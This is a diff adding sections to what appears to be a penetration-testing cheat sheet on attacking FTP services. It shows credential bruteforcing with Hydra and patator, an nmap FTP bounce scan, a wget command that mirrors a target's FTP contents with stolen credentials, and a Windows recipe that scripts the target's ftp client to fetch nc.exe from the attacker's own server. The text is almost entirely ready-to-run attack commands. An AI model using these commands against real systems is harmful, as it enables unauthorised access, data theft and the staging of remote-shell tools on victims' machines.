@@ -15,6 +15,12 @@ Username: anonymous
 Password: any@email.com (if prompted)
 ```
 
+## Clone 
+
+```
+wget -r --no-passive ftp://(USERNAME):(PASSWORD)@(TARGET IP ADDRESS)
+```
+
 ## Bruteforce
 
 `Hydra`
@@ -82,4 +88,18 @@ patator ftp_login host=FILE0 port=21 user=COMBO0 password=COMBO1 0=/root/oscp/la
 ## TCP FTP Bounce Scan
 ```
 nmap –top-ports 1000 -vv -Pn -b anonymous:password@10.11.1.125:21 127.0.0.1
+```
+
+## Script FTP 
+
+```
+echo open (YOUR IP) 21 > C:\share\ftp.txt (Writeable Directory on target)
+echo USER pwnt >> C:\share\ftp.txt
+echo passwd >> C:\share\ftp.txt (Password for your FTP Server)
+echo bin >> C:\share\ftp.txt (Sets transfer up for binary files/bytes)
+echo GET nc.exe C:\share\nc.exe>> C:\share\ftp.txt
+echo bye >> C:\share\ftp.txt
+```
+```
+ftp -v -n -s:C:\share\ftp.txt
 ```
